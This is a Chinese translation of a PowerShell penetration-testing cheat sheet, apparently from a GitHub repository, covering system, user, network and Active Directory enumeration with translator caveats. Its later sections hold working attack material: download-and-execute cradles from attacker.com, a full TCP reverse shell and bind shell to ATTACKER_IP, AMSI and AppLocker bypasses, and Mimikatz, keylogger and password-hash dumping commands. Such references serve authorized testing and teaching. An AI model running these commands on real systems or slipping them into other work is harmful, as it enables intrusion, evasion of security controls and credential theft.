# 💻 PowerShell 渗透测试完整速查表

<!-- language-home-navigation -->
[🏠 中文首页](../../README.zh-CN.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](./README.tr.md) • [🇬🇷 Ελληνικά](./README.el.md)

```
  ██████╗  ██████╗ ██╗    ██╗███████╗██████╗ ███████╗██╗  ██╗███████╗██╗     ██╗     
  ██╔══██╗██╔═══██╗██║    ██║██╔════╝██╔══██╗██╔════╝██║  ██║██╔════╝██║     ██║     
  ██████╔╝██║   ██║██║ █╗ ██║█████╗  ██████╔╝███████╗███████║█████╗  ██║     ██║     
  ██╔═══╝ ██║   ██║██║███╗██║██╔══╝  ██╔══██╗╚════██║██╔══██║██╔══╝  ██║     ██║     
  ██║     ╚██████╔╝╚███╔███╔╝███████╗██║  ██║███████║██║  ██║███████╗███████╗███████╗
  ╚═╝      ╚═════╝  ╚══╝╚══╝ ╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝
```

<p align="center">
  <img src="https://img.shields.io/badge/PowerShell-blue?style=for-the-badge&logo=powershell" alt="PowerShell">
  <img src="https://img.shields.io/badge/Windows-Hacking-red?style=for-the-badge" alt="安全测试">
  <img src="https://img.shields.io/badge/Post_Exploitation-orange?style=for-the-badge" alt="后渗透">
</p>

---

## 📋 目录

- [基础](#-basics)
- [系统枚举](#-system-enumeration)
- [用户枚举](#-user-enumeration)
- [网络命令](#-network-commands)
- [文件操作](#-file-operations)
- [进程与服务管理](#-process--service-management)
- [注册表操作](#-registry-operations)
- [Active Directory（活动目录）](#-active-directory)
- [下载与执行](#-download--execution)
- [反向 Shell](#-reverse-shells)
- [绕过技术](#-bypass-techniques)
- [进攻性安全工具](#-offensive-tools)
- [单行命令](#-one-liners)

---

<a id="-basics"></a>
## 🔰 基础

> **版本说明：** 本文主要采用 Windows PowerShell 环境的示例，混合了 PowerShell、cmd 及外部工具语法。PowerShell 7.x 的命令与别名可用性不同，例如已移除 `Get-WmiObject`、`Get-EventLog` 等旧命令；AD/GPO 命令还依赖相应管理模块。参见 [Microsoft 版本差异说明](https://learn.microsoft.com/en-us/powershell/scripting/whats-new/differences-from-windows-powershell)。`dir /a:h`、`dir /r`、`more < ...`、`sc query` 等也不能直接当作 PowerShell 别名的等价语法。

### 执行策略

> **译注：** Execution Policy（执行策略）不是安全边界。下方 `-Scope Process` 仅影响当前进程，而 `-Scope CurrentUser` 会保存当前用户的设置，不能都理解为“仅当前会话”；组策略还可能优先于本地设置。参见 [Microsoft 执行策略说明](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies)。

```powershell
# 检查当前策略
Get-ExecutionPolicy
Get-ExecutionPolicy -List

# 绕过执行策略（原文标为当前会话，作用域区别见译注）
Set-ExecutionPolicy Bypass -Scope Process
Set-ExecutionPolicy Unrestricted -Scope CurrentUser

# 以绕过执行策略的方式运行脚本
powershell -ExecutionPolicy Bypass -File script.ps1
powershell -ep bypass -File script.ps1
```

### 获取帮助

```powershell
# 获取命令帮助
Get-Help Get-Process
Get-Help Get-Process -Full
Get-Help Get-Process -Examples

# 更新帮助
Update-Help

# 列出所有命令
Get-Command
Get-Command -Module ActiveDirectory
Get-Command *process*
```

### 变量与运算符

```powershell
# 变量
$var = "value"
$number = 42
$array = @(1, 2, 3)
$hash = @{key="value"; name="test"}

# 环境变量
$env:USERNAME
$env:COMPUTERNAME
$env:USERDOMAIN
$env:PATH
Get-ChildItem Env:

# 比较运算符
-eq   # 相等
-ne   # 不相等
-gt   # 大于
-lt   # 小于
-like # 通配符匹配
-match # 正则表达式匹配
```

### 管道与过滤

```powershell
# 通过管道传递输出
Get-Process | Where-Object {$_.CPU -gt 10}
Get-Service | Where-Object Status -eq "Running"

# 选择属性
Get-Process | Select-Object Name, CPU, Id
Get-Process | Select-Object -First 5

# 排序
Get-Process | Sort-Object CPU -Descending

# 格式化输出
Get-Process | Format-Table -AutoSize
Get-Process | Format-List *
Get-Process | Out-GridView
```

---

<a id="-system-enumeration"></a>
## 🔍 系统枚举

### 系统信息

```powershell
# 计算机信息
Get-ComputerInfo
systeminfo
hostname
$env:COMPUTERNAME

# 操作系统版本
[System.Environment]::OSVersion
(Get-WmiObject Win32_OperatingSystem).Caption
(Get-CimInstance Win32_OperatingSystem).Version

# 体系结构
[Environment]::Is64BitOperatingSystem
$env:PROCESSOR_ARCHITECTURE

# 热修复与补丁
Get-HotFix
Get-HotFix | Where-Object InstalledOn -gt (Get-Date).AddDays(-30)
wmic qfe get Caption,Description,HotFixID,InstalledOn
```

### 已安装的软件

> **译注（Win32_Product）：** 查询此 WMI 类可能触发 MSI 软件包一致性检查及修复，并非单纯无副作用的清单读取。原文同时提供了注册表枚举示例。参见 [Microsoft 对相关行为的说明](https://learn.microsoft.com/en-us/troubleshoot/windows-server/admin-development/windows-installer-reconfigured-all-applications)。

```powershell
# 64 位软件
Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | 
    Select-Object DisplayName, Publisher, InstallDate

# 64 位操作系统中的 32 位软件
Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | 
    Select-Object DisplayName, Publisher, InstallDate

# 使用 WMI
Get-WmiObject -Class Win32_Product | Select-Object Name, Version

# 快速列表
Get-Package
```

### 杀毒软件与安全设置

```powershell
# 获取杀毒软件信息
Get-WmiObject -Namespace root\SecurityCenter2 -Class AntiVirusProduct
Get-MpComputerStatus  # Windows Defender

# 防火墙状态
Get-NetFirewallProfile
netsh advfirewall show allprofiles

# 防火墙规则
Get-NetFirewallRule | Where-Object Enabled -eq True
Get-NetFirewallRule -DisplayName "*Remote*"

# Windows Defender 排除项
Get-MpPreference | Select-Object -ExpandProperty ExclusionPath
```

### 计划任务

```powershell
# 列出计划任务
Get-ScheduledTask
Get-ScheduledTask | Where-Object State -eq "Ready"

# 任务详情
Get-ScheduledTask -TaskName "TaskName" | Get-ScheduledTaskInfo

# schtasks
schtasks /query /fo LIST /v
```

---

<a id="-user-enumeration"></a>
## 👤 用户枚举

### 本地用户

```powershell
# 当前用户
whoami
$env:USERNAME
[Environment]::UserName
[System.Security.Principal.WindowsIdentity]::GetCurrent().Name

# 所有本地用户
Get-LocalUser
Get-LocalUser | Select-Object Name, Enabled, LastLogon
net user

# 用户详情
Get-LocalUser Administrator
net user Administrator

# 用户组
Get-LocalGroupMember Administrators
net localgroup Administrators
```

### 用户权限

```powershell
# 当前权限
whoami /priv
whoami /all
whoami /groups

# 检查是否为管理员
([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
```

### 组

```powershell
# 列出本地组
Get-LocalGroup
net localgroup

# 组成员
Get-LocalGroupMember "Administrators"
Get-LocalGroupMember "Remote Desktop Users"
net localgroup "Administrators"
```

### 已登录用户

```powershell
# 当前登录用户
query user
quser
qwinsta

# 最近登录记录
Get-WmiObject Win32_LogonSession | Select-Object LogonId, LogonType, StartTime
Get-EventLog -LogName Security -InstanceId 4624 -Newest 10
```

---

<a id="-network-commands"></a>
## 🌐 网络命令

### 网络配置

```powershell
# IP 配置
Get-NetIPConfiguration
Get-NetIPAddress
ipconfig /all

# DNS
Get-DnsClientServerAddress
ipconfig /displaydns

# 路由
Get-NetRoute
route print

# ARP 表
Get-NetNeighbor
arp -a
```

### 开放端口与连接

```powershell
# TCP 连接
Get-NetTCPConnection
Get-NetTCPConnection -State Listen
Get-NetTCPConnection | Where-Object State -eq "Established"
netstat -ano

# UDP 连接
Get-NetUDPEndpoint

# 按端口查找进程
Get-NetTCPConnection -LocalPort 80 | Select-Object OwningProcess
Get-Process -Id (Get-NetTCPConnection -LocalPort 80).OwningProcess
```

### 网络测试

```powershell
# Ping
Test-Connection google.com
Test-Connection -ComputerName 192.168.1.1 -Count 4

# 端口检查
Test-NetConnection -ComputerName 192.168.1.1 -Port 445
Test-NetConnection -ComputerName google.com -Port 443

# 路由跟踪
Test-NetConnection -ComputerName google.com -TraceRoute

# DNS 查询
Resolve-DnsName google.com
nslookup google.com
```

### 网络共享

```powershell
# 列出共享
Get-SmbShare
net share

# 映射网络驱动器
New-PSDrive -Name Z -PSProvider FileSystem -Root "\\server\share"
net use Z: \\server\share

# 列出已连接的共享
Get-SmbConnection
net use

# 访问共享
Get-ChildItem \\server\share
dir \\192.168.1.1\c$
```

---

<a id="-file-operations"></a>
## 📁 文件操作

### 目录导航与列表

```powershell
# 当前目录
Get-Location
pwd

# 切换目录
Set-Location C:\Users
cd C:\Users

# 列出文件
Get-ChildItem
Get-ChildItem -Force  # 包括隐藏项
Get-ChildItem -Recurse
ls
dir

# 列出隐藏文件
Get-ChildItem -Hidden
Get-ChildItem -Attributes Hidden
dir /a:h
```

### 文件搜索

```powershell
# 按名称查找文件
Get-ChildItem -Path C:\ -Recurse -Name "*.txt" -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\ -Recurse -Filter "password*" -ErrorAction SilentlyContinue

# 查找包含指定文本的文件
Get-ChildItem -Recurse | Select-String "password"
Select-String -Path "C:\*.txt" -Pattern "password"

# 查找大文件
Get-ChildItem -Recurse | Where-Object Length -gt 100MB

# 查找最近修改的文件
Get-ChildItem -Recurse | Where-Object LastWriteTime -gt (Get-Date).AddDays(-7)
```

### 读取与写入文件

```powershell
# 读取文件
Get-Content file.txt
Get-Content file.txt -Head 10
Get-Content file.txt -Tail 10
type file.txt
cat file.txt

# 写入文件
Set-Content file.txt "content"
Add-Content file.txt "append"
"content" | Out-File file.txt
"content" >> file.txt  # 追加

# 复制、移动或删除
Copy-Item source.txt destination.txt
Move-Item source.txt destination.txt
Remove-Item file.txt
Remove-Item folder -Recurse -Force
```

### 备用数据流（Alternate Data Streams，ADS）

```powershell
# 列出 ADS
Get-Item file.txt -Stream *
dir /r file.txt

# 读取 ADS
Get-Content file.txt -Stream secret
more < file.txt:secret

# 写入 ADS
Set-Content file.txt -Stream hidden "secret data"
echo "data" > file.txt:hidden

# 移除 ADS
Remove-Item file.txt -Stream hidden
```

### 哈希计算

```powershell
# 获取文件哈希
Get-FileHash file.txt
Get-FileHash file.txt -Algorithm MD5
Get-FileHash file.txt -Algorithm SHA256
Get-FileHash file.txt -Algorithm SHA512

# 校验哈希
(Get-FileHash file.txt).Hash -eq "expected_hash"
```

---

<a id="-process--service-management"></a>
## ⚙️ 进程与服务管理

### 进程

```powershell
# 列出进程
Get-Process
Get-Process | Sort-Object CPU -Descending
Get-Process -Name "chrome"
tasklist

# 进程详情
Get-Process -Id 1234 | Format-List *
Get-WmiObject Win32_Process | Select-Object Name, ProcessId, CommandLine

# 启动进程
Start-Process notepad.exe
Start-Process -FilePath "cmd.exe" -ArgumentList "/c whoami"
Start-Process -FilePath "powershell.exe" -Verb RunAs  # 以管理员身份运行

# 停止进程
Stop-Process -Name "notepad"
Stop-Process -Id 1234 -Force
taskkill /PID 1234 /F
```

### 服务

```powershell
# 列出服务
Get-Service
Get-Service | Where-Object Status -eq "Running"
Get-Service | Where-Object StartType -eq "Automatic"
sc query

# 服务详情
Get-Service -Name "WinRM" | Format-List *
Get-WmiObject Win32_Service | Select-Object Name, StartMode, PathName

# 启动或停止服务
Start-Service -Name "WinRM"
Stop-Service -Name "WinRM"
Restart-Service -Name "WinRM"
net start WinRM
net stop WinRM

# 服务路径（用于检查未加引号的路径）
Get-WmiObject Win32_Service | Select-Object Name, PathName | Where-Object {$_.PathName -notlike '"*'}
```

---

<a id="-registry-operations"></a>
## 📝 注册表操作

### 读取注册表

```powershell
# 列出注册表键
Get-ChildItem HKLM:\SOFTWARE
Get-ChildItem HKCU:\SOFTWARE

# 获取注册表值
Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
Get-ItemPropertyValue HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run -Name "SecurityHealth"

# 搜索注册表
Get-ChildItem HKLM:\ -Recurse -ErrorAction SilentlyContinue | Where-Object {$_.Name -match "password"}
```

### 写入注册表

```powershell
# 创建键
New-Item -Path HKCU:\SOFTWARE\MyKey

# 设置值
Set-ItemProperty -Path HKCU:\SOFTWARE\MyKey -Name "Value" -Value "Data"
New-ItemProperty -Path HKCU:\SOFTWARE\MyKey -Name "NewValue" -Value "Data" -PropertyType String

# 删除
Remove-ItemProperty -Path HKCU:\SOFTWARE\MyKey -Name "Value"
Remove-Item -Path HKCU:\SOFTWARE\MyKey -Recurse
```

### 重要注册表位置

```powershell
# 自动运行位置
Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
Get-ItemProperty HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce

# 卸载信息（已安装软件）
Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*

# SAM（需要 SYSTEM 权限）
# HKLM:\SAM\SAM

# LSA 机密信息
# HKLM:\SECURITY\Policy\Secrets
```

---

<a id="-active-directory"></a>
## 🏢 Active Directory（活动目录）

### 域信息

```powershell
# 域信息
Get-ADDomain
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$env:USERDNSDOMAIN

# 域控制器
Get-ADDomainController
Get-ADDomainController -Filter * | Select-Object Name, IPv4Address

# 林信息
Get-ADForest

# 信任关系
Get-ADTrust -Filter *
```

### 用户枚举（AD）

> **译注：** `AdminCount -eq 1` 表示对象曾因管理组成员身份而受系统保护，不能简单等同于当前所有管理员名单；参见 [adminCount 官方定义](https://learn.microsoft.com/en-us/windows/win32/adschema/a-admincount)。存在 SPN 也不自动意味着可以成功离线破解。

```powershell
# 所有域用户
Get-ADUser -Filter *
Get-ADUser -Filter * -Properties *
Get-ADUser -Filter * | Select-Object Name, SamAccountName, Enabled

# 指定用户
Get-ADUser -Identity administrator -Properties *

# 具有指定属性的用户
Get-ADUser -Filter {AdminCount -eq 1}  # 管理员
Get-ADUser -Filter {ServicePrincipalName -ne "$null"}  # 可进行 Kerberoasting 的账户

# 搜索用户
Get-ADUser -Filter {Name -like "*admin*"}
Get-ADUser -Filter {Description -like "*password*"}
```

### 组枚举（AD）

```powershell
# 所有组
Get-ADGroup -Filter *

# Domain Admins（域管理员组）
Get-ADGroupMember "Domain Admins"
Get-ADGroupMember "Domain Admins" -Recursive

# Enterprise Admins（企业管理员组）
Get-ADGroupMember "Enterprise Admins"

# 用户所属组
Get-ADPrincipalGroupMembership username
```

### 计算机枚举（AD）

```powershell
# 所有计算机
Get-ADComputer -Filter *
Get-ADComputer -Filter * -Properties *

# 域控制器
Get-ADComputer -Filter {PrimaryGroupId -eq 516}

# 服务器
Get-ADComputer -Filter {OperatingSystem -like "*Server*"}
```

### 组策略对象（GPO）信息

```powershell
# 列出 GPO
Get-GPO -All
Get-GPO -All | Select-Object DisplayName, GpoStatus

# GPO 详情
Get-GPO -Name "Default Domain Policy"

# GPO 报告
Get-GPOReport -Name "Default Domain Policy" -ReportType HTML -Path report.html
```

---

<a id="-download--execution"></a>
## ⬇️ 下载与执行

### 下载文件

```powershell
# Invoke-WebRequest（原文类比 wget/curl，别名差异见译注）
Invoke-WebRequest -Uri "http://attacker.com/file.exe" -OutFile "file.exe"
iwr -Uri "http://attacker.com/file.exe" -OutFile "file.exe"
wget "http://attacker.com/file.exe" -OutFile "file.exe"

# WebClient（原文称其更快，实际取决于环境）
(New-Object Net.WebClient).DownloadFile("http://attacker.com/file.exe", "C:\file.exe")

# 下载字符串（用于脚本）
(New-Object Net.WebClient).DownloadString("http://attacker.com/script.ps1")

# Invoke-RestMethod
Invoke-RestMethod -Uri "http://attacker.com/file.exe" -OutFile "file.exe"

# BITS 传输（原文称其更隐蔽，不代表不会被检测）
Start-BitsTransfer -Source "http://attacker.com/file.exe" -Destination "file.exe"

# certutil（可被利用的系统自带程序，LOLBin）
certutil -urlcache -split -f "http://attacker.com/file.exe" file.exe
```

### 下载并执行（内存中）

```powershell
# IEX：Invoke-Expression（原文称其为无文件执行）
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/script.ps1')
IEX (iwr 'http://attacker.com/script.ps1')

# 使用变量
$script = (New-Object Net.WebClient).DownloadString('http://attacker.com/script.ps1')
IEX $script

# Invoke-命令
Invoke-Command -ScriptBlock {IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/script.ps1')}
```

### 编码执行

```powershell
# 将命令编码为 Base64
$command = "whoami"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encoded = [Convert]::ToBase64String($bytes)
echo $encoded

# 执行编码后的命令
powershell -enc <base64_string>
powershell -EncodedCommand <base64_string>

# 单行编码器
[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/script.ps1')"))
```

---

<a id="-reverse-shells"></a>
## 🔌 反向 Shell

### PowerShell 反向 Shell

```powershell
# TCP 反向 Shell
$client = New-Object System.Net.Sockets.TCPClient("ATTACKER_IP",4444)
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{0}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
    $sendback = (iex $data 2>&1 | Out-String )
    $sendback2 = $sendback + "PS " + (pwd).Path + "> "
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte,0,$sendbyte.Length)
    $stream.Flush()
}
$client.Close()
```

### 单行反向 Shell

> **示例说明：** 原文 Powerline 示例使用双引号包装含 `$client` 等变量的命令；从现有 PowerShell 会话启动时会受到外层字符串变量展开的影响。此处保留原文写法，不能将其视为不受调用环境影响的单行命令。

```powershell
# Nishang
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/Invoke-PowerShellTcp.ps1')
Invoke-PowerShellTcp -Reverse -IPAddress ATTACKER_IP -Port 4444

# PowerCat
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/powercat.ps1')
powercat -c ATTACKER_IP -p 4444 -e cmd

# Powerline
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

### 绑定 Shell

```powershell
# 绑定到端口
$listener = [System.Net.Sockets.TcpListener]4444
$listener.Start()
$client = $listener.AcceptTcpClient()
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{0}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
    $sendback = (iex $data 2>&1 | Out-String )
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback)
    $stream.Write($sendbyte,0,$sendbyte.Length)
    $stream.Flush()
}
$client.Close()
$listener.Stop()
```

---

<a id="-bypass-techniques"></a>
## 🛡️ 绕过技术

> **适用范围：** Base64 是编码，不是加密，也不能保证规避检测。本文 AMSI“内存修补”代码仅声明了部分函数并加载类型，末尾明确省略完整实现；不能当作完整绕过脚本。PowerShell 2.0、InstallUtil、MSBuild 等示例依赖环境与有效策略，不能保证绕过 CLM 或 AppLocker。参见 [Microsoft 对 PowerShell 应用控制行为的说明](https://learn.microsoft.com/en-us/powershell/scripting/security/app-control/how-app-control-works)。

### 执行策略绕过

```powershell
# 绕过方法
powershell -ep bypass
powershell -ExecutionPolicy Bypass
Set-ExecutionPolicy Bypass -Scope Process

# 读取并通过管道传递
Get-Content script.ps1 | PowerShell -NoProfile -
type script.ps1 | PowerShell -NoProfile -

# 下载字符串（不将脚本另存为磁盘文件）
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/script.ps1')
```

### AMSI 绕过

```powershell
# 简单 AMSI 绕过（可能被检测）
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# 经过混淆
$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$b=$a.GetField('amsiInitFailed','NonPublic,Static')
$b.SetValue($null,$true)

# 内存修补（原文标为需要管理员权限；下方示例不完整）
$win32 = @"
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@
Add-Type $win32
# ……（此处省略完整绕过代码）
```

### 受限语言模式（Constrained Language Mode）绕过

```powershell
# 检查语言模式
$ExecutionContext.SessionState.LanguageMode

# 若为 ConstrainedLanguage，原文建议尝试：
# - PowerShell 2.0（若可用）
powershell -version 2

# - InstallUtil
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U payload.exe
```

### AppLocker 绕过

```powershell
# MSBuild
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe payload.xml

# InstallUtil
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false payload.exe

# Regasm/Regsvcs
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /U payload.dll

# 检查 AppLocker 规则
Get-AppLockerPolicy -Effective | Select-Object -ExpandProperty RuleCollections
```

---

<a id="-offensive-tools"></a>
## 🔫 进攻性安全工具

### PowerSploit

```powershell
# 下载
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/PowerSploit/Recon/PowerView.ps1')

# PowerView（AD 枚举）
Get-NetDomain
Get-NetUser
Get-NetGroup
Get-NetComputer
Find-LocalAdminAccess
Invoke-UserHunter

# PowerUp（权限提升）
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/PowerUp.ps1')
Invoke-AllChecks

# Invoke-Mimikatz
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds
Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"'
```

### Empire/PowerShell Empire

```powershell
# Stager 执行（来自 Empire）
powershell -noP -sta -w 1 -enc <base64_payload>
```

### Nishang

```powershell
# 反向 Shell
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/nishang/Shells/Invoke-PowerShellTcp.ps1')
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.10.10 -Port 4444

# 键盘记录器
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/nishang/Gather/Keylogger.ps1')
Keylogger

# Get-PassHashes
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/nishang/Gather/Get-PassHashes.ps1')
Get-PassHashes
```

---

<a id="-one-liners"></a>
## ⚡ 单行命令

### 枚举单行命令

```powershell
# 系统信息
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"

# 用户
Get-LocalUser | Select Name,Enabled

# 已安装的软件
Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select DisplayName

# 开放端口
Get-NetTCPConnection -State Listen | Select LocalAddress,LocalPort,OwningProcess

# 运行中的服务
Get-Service | Where Status -eq Running | Select Name,DisplayName

# 计划任务
schtasks /query /fo TABLE | findstr /v "TaskName"

# 杀毒软件状态
Get-MpComputerStatus | Select RealTimeProtectionEnabled,IoavProtectionEnabled

# 防火墙
Get-NetFirewallProfile | Select Name,Enabled
```

### 下载单行命令

```powershell
# PowerShell 下载
(New-Object Net.WebClient).DownloadFile("http://url/file","C:\file")
IEX (New-Object Net.WebClient).DownloadString("http://url/script.ps1")
Invoke-WebRequest -Uri "http://url/file" -OutFile "file"

# certutil
certutil -urlcache -split -f "http://url/file" file

# bitsadmin
bitsadmin /transfer job /download /priority high http://url/file C:\file
```

### 命令表

| 用途 | 命令 |
|---------|---------|
| 当前用户 | `whoami` |
| 所有用户 | `Get-LocalUser` |
| 管理员 | `Get-LocalGroupMember Administrators` |
| 系统信息 | `systeminfo` |
| IP 配置 | `Get-NetIPAddress` |
| 开放端口 | `Get-NetTCPConnection -State Listen` |
| 进程 | `Get-Process` |
| 服务 | `Get-Service \| Where Status -eq Running` |
| 查找文件 | `Get-ChildItem -Recurse -Filter "*.txt"` |
| 搜索内容 | `Select-String -Path "C:\*" -Pattern "password"` |
| 下载文件 | `(New-Object Net.WebClient).DownloadFile("url","file")` |
| 编码执行 | `powershell -enc <base64>` |

---

## 📚 资源

- [PowerSploit](https://github.com/PowerShellMafia/PowerSploit)
- [Nishang](https://github.com/samratashok/nishang)
- [PowerShell Empire](https://github.com/EmpireProject/Empire)
- [LOLBAS](https://lolbas-project.github.io/)
- [HackTricks PowerShell](https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters)

### 相关速查表
- [Mimikatz](../../Mimikatz/README.md)
- [Windows 权限提升](../../Windows-PrivEsc/README.md)
- [Metasploit](../../Metasploit/README.md)

---

<p align="center">
  <b>💻 掌握用于渗透测试的 PowerShell！</b><br>
  <i>功能强大的 Windows 脚本语言</i>
</p>
